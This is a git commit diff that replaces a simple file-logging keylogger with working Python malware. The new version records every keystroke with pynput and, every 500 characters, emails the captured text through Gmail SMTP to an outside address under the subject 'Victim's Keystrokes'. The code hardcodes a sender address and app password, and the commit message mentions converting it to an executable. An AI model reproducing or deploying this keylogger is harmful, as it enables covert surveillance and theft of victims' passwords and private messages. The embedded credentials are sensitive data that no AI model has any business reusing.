02ef37a5d1ddbdb9451a2968ee3cdc808fb34e9b
eroge-69 <erogexunamed@gmail.com>
2025-08-27 21:36:03 +0700

    Upload Keylogger.py via PY to EXE tool

--- python-files/Keylogger.py
+++ python-files/Keylogger.py
@@ -1,18 +1,51 @@
-from pynput import keyboard
+#YouTube Tutorial ---> 
+#Python version 3.11.2
+from pynput.keyboard import Listener
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
-# File jahan log save hoga
-log_file = "keylog.txt"
+keystrokes = ""
 
-def on_press(key):
-    try:
-        key_data = f"Key {key.char} pressed\n"
-    except AttributeError:
-        key_data = f"Special key {key} pressed\n"
+def log_happykey(key):
+    global keystrokes
+    key = str(key).replace("'", "")
 
-    # Save to file
-    with open(log_file, "a") as f:
-        f.write(key_data)
+    if key == 'Key.space':
+        key = ' '
+    elif key == 'Key.enter':
+        key = '\n'
+    elif key == 'Key.shift':
+        key = ''
+    elif key == 'Key.backspace':
+        key = '<'
 
-# Listener start karo
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+    keystrokes += key
+
+    # Check if the accumulated keystrokes reach 500, then send an email. Change this number as you like
+    if len(keystrokes) >= 500:
+        send_email_with_content(keystrokes)
+        keystrokes = ""  #Reset keystrokes after sending the email
+
+def send_email_with_content(content):
+    from_email = "yogeshdhangar12u@gmail.com"
+    to_email = "cyberhacker12u@gmail.com"
+    password = "yvim areg ujil piev"
+
+    msg = MIMEMultipart()
+    msg['From'] = from_email
+    msg['To'] = to_email
+    msg['Subject'] = "Victim's Keystrokes"
+    msg.attach(MIMEText(content, 'plain'))
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(from_email, password)
+
+    server.sendmail(from_email, to_email, msg.as_string())
+
+    server.quit()
+
+#Start keystroke logging
+with Listener(on_press=log_happykey) as l:
+    l.join()
